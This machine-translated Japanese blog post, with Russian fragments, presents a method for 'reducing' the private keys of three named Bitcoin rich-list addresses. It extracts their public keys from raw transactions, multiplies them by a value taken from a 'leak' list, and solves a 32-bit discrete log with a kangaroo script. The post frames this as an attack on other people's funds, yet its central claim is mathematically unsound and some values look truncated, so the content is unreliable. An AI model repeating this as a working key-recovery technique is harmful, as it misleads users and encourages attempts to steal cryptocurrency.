# ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/zu2yiaZ_LOs" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://pastebin.com/eLMYtzV8" target="_blank" rel="noreferrer noopener">この記事では、 「BLOCKCHAIN FOLBIT LEAKS」リストからの漏洩と</a><a href="https://en.wikipedia.org/wiki/Unspent_transaction_output" target="_blank" rel="noreferrer noopener">「UTXO」</a>からの公開鍵だけを知っている秘密鍵を削減する方法を示します。<br>実験的な部分では、<a href="https://github.com/demining/CryptoDeepTools/tree/main/08ReducePrivateKey" target="_blank" rel="noreferrer noopener">08ReducePrivateKey</a>スクリプトを使用して Bitcoin ウォレットを復元します。</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><u>楕円曲線のスカラー倍算は、</u></em><code>P</code>曲線の時間に点を追加する操作です<code>k</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>Q=kP=P+P+P, k times</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><br><code>P</code><em>は楕円曲線上の点で</em>あり、<em>大きな自然数</em><code>k</code>です。<em></em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>プリミティブな実装では、<code>ECC</code>スカラー乗算が主要な計算操作です。効率を改善する重要な要素は<code>ECC</code>、高速スカラー乗算の実装です。<a href="https://habr.com/ru/post/680932/" target="_blank" rel="noreferrer noopener"><em><u>そのため、多くの研究者がスカラー倍増の加速に関する</u></em></a>さまざまな研究を提案しています。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading -->
<h2>ECPy ライブラリを使ってみよう</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>ECPy は以下を提供します。</h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>ECDSA 署名</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Ed25519 署名</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ECSchnorr シグネチャ</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ボロメアの署名</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ポイント操作</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>私たちの研究の多くでは、ライブラリを使用し</em><code>ECPy</code><em>、</em><code>Google Colab</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener"><strong>[TerminalGoogleColab]</strong></a>を開く<a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="http://git%20clone%20https//github.com/demining/CryptoDeepTools.git" target="_blank" rel="noreferrer noopener"><strong>「08ReducePrivateKey」</strong></a>リポジトリを利用しよう<a href="http://git%20clone%20https//github.com/demining/CryptoDeepTools.git" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/08ReducePrivateKey/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/201/da1/f9f/201da1f9f8e93fbbeae07e8e9af7723e.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>ECPy ライブラリをインストールします。</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt install python2-minimal

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip3 install ECPy</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/d7c/1d7/b35/d7c1d7b35f8246398d24a4e40744a43e.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Python</em>スクリプト:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/maxwell.py" target="_blank" rel="noreferrer noopener">maxwell.py</a>、<em>保存し</em>&nbsp;<code>код</code>てターミナルで実行<code>Google Colab</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>from ecpy.curves     import Curve,Point

cv = Curve.get_curve('secp256k1')
G  = Point(0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,
           0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8,
           cv)
x  = 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a1

PUBKEY  = x*G

print(PUBKEY)</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>コマンドを実行します。</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 maxwell.py</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/b6b/c19/0fe/b6bc190fe89cda2172f7b29a30aeaf16.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>結果：</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>(0x3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63 , 0xc0c686408d517dfd67c2367651380d00d126e4229631fd03f8ff35eef1a61e3c)
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>x座標に注意</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>x value = 3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63

0200000000000000000000003B78CE563F89A0ED9414F5AA28AD0D96D6795F9C63</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>この<em>公開鍵は</em><a href="https://bitcointalk.org/index.php?topic=1118704.msg11862486#msg11862486" target="_blank" rel="noreferrer noopener"><u>「マクスウェルのバニティ公開鍵」</u></a>と呼ばれます。<a href="https://bitcointalk.org/index.php?topic=1118704.msg11862486#msg11862486" target="_blank" rel="noreferrer noopener"><u></u></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0 --&gt; 0x3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63, 0x3f3979bf72ae8202983dc989aec7f2ff2ed91bdd69ce02fc0700ca100e59ddf3
0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a1 --&gt; 0x3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63, 0xc0c686408d517dfd67c2367651380d00d126e4229631fd03f8ff35eef1a61e3c

p = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

((p-1)/2) = 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0

0200000000000000000000003B78CE563F89A0ED9414F5AA28AD0D96D6795F9C63
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":4} -->
<h4>この公開鍵に戻ります。</h4>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2>実験的な部分に移りましょう:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://bitinfocharts.com/top-100-richest-bitcoin-addresses.html" target="_blank" rel="noreferrer noopener"><strong>ビットコイン リッチ リスト</strong></a>には、<code>100 BTC</code>&nbsp;<em>残高以上の</em>3 つの異なるビットコイン アドレスがあります。<a href="https://bitinfocharts.com/top-100-richest-bitcoin-addresses.html" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://www.blockchain.com/btc/address/1KpHWkpG7BGxDuSJKYPYVvNSC6womEZdTu" target="_blank" rel="noreferrer noopener">1KpHWkpG7BGxDusJKYPYVvNSC6womEZdTu</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://www.blockchain.com/btc/address/1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm" target="_blank" rel="noreferrer noopener">1MjGyKirLzq4WeuJKyFZMmkjAv7rH1TABm</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://www.blockchain.com/btc/address/1GrTCkqqcXhVTXoQkPJjU5LuFKgAvC3iqJ" target="_blank" rel="noreferrer noopener">1GrTCkqqcXhVTXoQkPJjU5LuFKgAvC3iqJ</a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>これらのビットコイン アドレスを取得してみましょう<code>UTXO</code>。これで 3 つの署名ができました<code>ECDSA</code>&nbsp;<em>(スクリプト</em><a href="https://github.com/demining/CryptoDeepTools/tree/main/01BlockchainGoogleDrive" target="_blank" rel="noreferrer noopener"><em>01BlockchainGoogleDrive</em></a><em>を適用)。</em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://blockchain.info/rawtx/c1ea2c9e48ce632488817781f89730d77cd4121f1c8f70a4be44d2a15e8e08d0?format=hex" target="_blank" rel="noreferrer noopener"><strong>c1ea2c9e48ce632488817781f89730d77cd4121f1c8f70a4be44d2a15e8e08d0</strong></a><br><a href="https://blockchain.info/rawtx/37dadae30c6f7c6c4a2c930db979494783005a8e94d6861039fed21e3fa859b9?format=hex" target="_blank" rel="noreferrer noopener"><strong>37dadae30c6f7c6c4a2c930db979494783005a8e94d6861039fed21e3fa859b9</strong></a><br><a href="https://blockchain.info/rawtx/9dacfc8243109475383d5b30e8d5f0ba23d023bd47649064c208d4586b278436?format=hex" target="_blank" rel="noreferrer noopener"><strong>9dacfc8243109475383d5b30e8d5f0ba23d023bd47649064c208d4586b278436</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>RawTX</code>3 つの異なるビットコイン アドレスを取得する</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>01000000017fbdd4c9991d0ba4fb0a0c06f6933442c17678bce6dfa4bf80e22ed530bb933c010000008a47304402206d0ab626a7e477c27602ed63b2651517af077e6f3fafda671dd9952dfcb5f0b90220168eb51a48ce7496a699a800299f15638e0a7f36ae84e84e26df0cd2a280a70e014104b3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97fe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4feffffff0240597307000000001976a914211090b628fa6351fa8240232e3c2753fd5eece588ac700369d2050000001976a914ce639943ce1602e30b249faf74388ee0eeb1d3c588ac84b90700
01000000014666d430766d611cc7f2c21494e68e463ac4be8bb2f70b91693728324849e1c3010000008a473044022057a02a4abc38e2e3e1809b05402cf52faef7e101d6364d43bb0305f8796b0fb202203d1934a016c91072ffe137575734454161284ab3371a0cfc6767db7f27f24a75014104ea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240cffffffff01b0feea0b000000001976a9148300ab0caebb6e85cf9e6b287a57924d1ac7c82f88ac00000000
01000000019d8e5e1bfac780b813e41517926aca95048e1dea92cbbe2a98475ff53ad38ccd000000008c493046022100c7b76326879a5ec7df2ffedb292a45c13c6f154982fc2cd7e05f0d0d0dce2d05022100d7fd43416608eaeb6356f04b601ac6edd23e0f82de44689fe5a7aa2f576637a001410480edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2b5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56cffffffff01a93de702000000001976a914119fb35bad07974c1a8d47d210ca3048bb13be8788ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>必要なモジュールをすべてインストールします。</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bitcoin
ecdsa
utils
base58


pip2 install -r requirements.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/489/a48/5af/489a485af916d20a567f6675da99fe06.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/breakECDSA.py" target="_blank" rel="noreferrer noopener">breakECDSA.py</a>スクリプトを使用して、ビットコイン アドレスの<em>公開鍵</em>を見つけます。</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000017fbdd4c9991d0ba4fb0a0c06f6933442c17678bce6dfa4bf80e22ed530bb933c010000008a47304402206d0ab626a7e477c27602ed63b2651517af077e6f3fafda671dd9952dfcb5f0b90220168eb51a48ce7496a699a800299f15638e0a7f36ae84e84e26df0cd2a280a70e014104b3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97fe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4feffffff0240597307000000001976a914211090b628fa6351fa8240232e3c2753fd5eece588ac700369d2050000001976a914ce639943ce1602e30b249faf74388ee0eeb1d3c588ac84b90700 &gt;&gt; PublicKeys.txt
python2 breakECDSA.py 01000000014666d430766d611cc7f2c21494e68e463ac4be8bb2f70b91693728324849e1c3010000008a473044022057a02a4abc38e2e3e1809b05402cf52faef7e101d6364d43bb0305f8796b0fb202203d1934a016c91072ffe137575734454161284ab3371a0cfc6767db7f27f24a75014104ea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240cffffffff01b0feea0b000000001976a9148300ab0caebb6e85cf9e6b287a57924d1ac7c82f88ac00000000 &gt;&gt; PublicKeys.txt
python2 breakECDSA.py 01000000019d8e5e1bfac780b813e41517926aca95048e1dea92cbbe2a98475ff53ad38ccd000000008c493046022100c7b76326879a5ec7df2ffedb292a45c13c6f154982fc2cd7e05f0d0d0dce2d05022100d7fd43416608eaeb6356f04b601ac6edd23e0f82de44689fe5a7aa2f576637a001410480edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2b5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56cffffffff01a93de702000000001976a914119fb35bad07974c1a8d47d210ca3048bb13be8788ac00000000 &gt;&gt; PublicKeys.txt
</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/afb/ec8/169/afbec8169caf989b8550aadad4dd3e59.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>ローンチ後、 3 つのビットコイン アドレスすべての<em>公開鍵</em>を受け取ります。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>結果は次のファイルに保存されます: PublicKeys.txt</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Откроем файл: PublicKeys.txt

cat PublicKeys.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/773/4e4/670/7734e4670c08dae7004135f681bd0942.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>PUBKEY = 04b3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97fe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4
PUBKEY = 04ea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240c
PUBKEY = 0480edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2b5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56c
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>これらの公開鍵を座標点 (x,y) の形式で作成しましょう。</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>(0xb3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97 , 0xfe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4)
(0xea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd , 0x1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240c)
(0x80edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2 , 0xb5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56c)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>座標点を<code>(x,y)</code>ファイルに保存します:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/Coordinates.txt" target="_blank" rel="noreferrer noopener"><strong>Coordinates.txt</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>ブロックチェーンFOLBITリーク</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://pastebin.com/eLMYtzV8" target="_blank" rel="noreferrer noopener"><strong>「BLOCKCHAIN FOLBIT LEAKS」</strong></a>で既知のブロックチェーンリークのリストを開いてみましょう<code>2019 год</code><a href="https://pastebin.com/eLMYtzV8" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/5b1/643/cb0/5b1643cb05baa67368df5f79277135ae.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>値をコピーしましょう:</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/bbb/497/cfc/bbb497cfc8a2ec00af285f19851e6ce8.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>(x,y)</code>それでは、リーク値を適用して<strong>、</strong>すべてのポイント座標に対してスカラー乗算を実行しましょう。<strong></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/maxwell.py" target="_blank" rel="noreferrer noopener">maxwell.py</a>コードを変更し、名前を<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/scalarEC.py" target="_blank" rel="noreferrer noopener">scalarEC.pyに変更します。</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>追加しましょう<code>with open("Coordinates.txt", "rt") as base:</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>新しい座標はすべてファイルに保存されます。<code>SaveBase.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>B = 0xdac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>B</code>リストからコードに値を追加して、&nbsp;<em>Python</em>スクリプトとして保存しましょう:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/scalarEC.py" target="_blank" rel="noreferrer noopener">scalarEC.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>from ecpy.curves     import Curve,Point

with open("Coordinates.txt", "rt") as base:
    for line in base.read().splitlines():
        Gx, Gy = map(lambda v: int(v, 16), line&#91;1: -1].split(" , "))

        cv = Curve.get_curve('secp256k1')
    
        P  = Point(Gx,Gy,cv)

        B  = 0xdac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae

        A  = B*P

        with open("SaveBase.txt", "a") as file:
            file.write(str(A))
            file.write("\n")</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>スクリプトを実行しましょう:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 scalarEC.py

Результат сохранился в файле: SaveBase.txt

Откроем файле: SaveBase.txt

cat SaveBase.txt
</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/cf3/657/dd0/cf3657dd0b79a3ce0e5cdaa44120e4ba.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>(0x92b9eeebb8c4fa108359bd31367e36b7fe65b4a7e06d533b476dee097572a4c0 , 0x4d2beb1835a2f8b85e3f61d32094dbf0b4c7a212bee42ee4612193c0653c6e56)
(0x65304d24c0edc862843587a96ea700f86e9e70e7801ac7df9efd2de84230c3e7 , 0x7af6d83573849d2368a021e835c5768e1b791c0c1b4cfafb9795058df5f27958)
(0x433c15b724948371877dd3c1014d59d1a13d76a29e4948903623a74767736b97 , 0x13f15f3bb28a4766952e10da9717aa3cc0bad90b0414f483718531d584721ea3)
</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>すべての座標点で漏れ値をスカラー倍した後、<em><u>新しい点を取得し</u></em><code>(x,y)</code>ます<em><u></u></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3>これらの座標を圧縮されていない公開鍵の形式に書き換えてみましょう。</h3>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2>この公開鍵を見てみましょう。</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0465304d24c0edc862843587a96ea700f86e9e70e7801ac7df9efd2de84230c3e77af6d83573849d2368a021e835c5768e1b791c0c1b4cfafb9795058df5f27958
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/kangaroo/" target="_blank" rel="noreferrer noopener">これで、ポラードのカンガルー</a>法を使用して秘密鍵を見つけることができます<a href="https://cryptodeep.ru/kangaroo/" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/kangaroo/" target="_blank" rel="noreferrer noopener"><em>以前、 「Pollard's Kangaroo は、既知の範囲で secp256k1 PRIVATE KEY + NONCES の離散対数の解を見つける」という</em></a>記事を公開しました。<a href="https://cryptodeep.ru/kangaroo/" target="_blank" rel="noreferrer noopener"><em></em></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Python</em>スクリプトの<em><u>新しいコード</u></em>&nbsp;:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/kangaroo.py" target="_blank" rel="noreferrer noopener">kangaroo.py</a>を使用してみましょう。<code>Pollard's Kangaroo</code><code>Telariust</code><em></em><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/kangaroo.py" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3>次のコマンドで gmpy2 モジュールをインストールします。</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt install python-gmpy2</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/0f1/448/125/0f144812547a5d8e84cf66ee71b0c6d6.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/764/6ac/808/7646ac808066d138af9c5b5380baf507.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>次に、<em>Python</em>スクリプト<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/kangaroo.py" target="_blank" rel="noreferrer noopener">kangaroo.pyを実行します。</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 kangaroo.py 32 0465304D24C0EDC862843587A96EA700F86E9E70E7801AC7DF9EFD2DE84230C3E77AF6D83573849D2368A021E835C5768E1B791C0C1B4CFAFB9795058DF5F27958
</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/25d/4cd/dd4/25d4cddd4d35d1fc6331dca485cff638.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/617/c13/58f/617c1358faaf9104fc774fda67fbf9d1.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>ターミナルでは、次のように取得できたことがわかります<code>"prvkey"</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&#91;prvkey#32] 0x00000000000000000000000000000000000000000000000000000000795f9c63
&#91;pubkey#32] 0465304d24c0edc862843587a96ea700f86e9e70e7801ac7df9efd2de84230c3e77af6d83573849d2368a021e835c5768e1b791c0c1b4cfafb9795058df5f27958
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>結果はファイルに保存されます: Privkey.txt</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Откроем файл командой: 

cat Privkey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/94f/145/0a5/94f1450a509aa57879f2864348d1fe4c.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>00000000000000000000000000000000000000000000000000000000795f9c63</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>公開鍵の縮小された秘密鍵を取得しました。</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0465304D24C0EDC862843587A96EA700F86E9E70E7801AC7DF9EFD2DE84230C3E77AF6D83573849D2368A021E835C5768E1B791C0C1B4CFAFB9795058DF5F27958
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>秘密鍵に注意してください。</h3>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/f8d/aae/bb6/f8daaebb61f7ee1e398441c85ab85209.png" alt="ECPy + Google Colab ライブラリを使用したスカラー倍算による秘密鍵の削減"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>後者は公開<em>鍵</em><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/maxwell.py" target="_blank" rel="noreferrer noopener">「マクスウェルのバニティ公開鍵」と</a><code>8 цифр</code>一致します<code>формате HEX</code><em></em><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/maxwell.py" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0200000000000000000000003B78CE563F89A0ED9414F5AA28AD0D96D6795F9C63</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>A = 0x00000000000000000000000000000000000000000000000000000000795f9c63
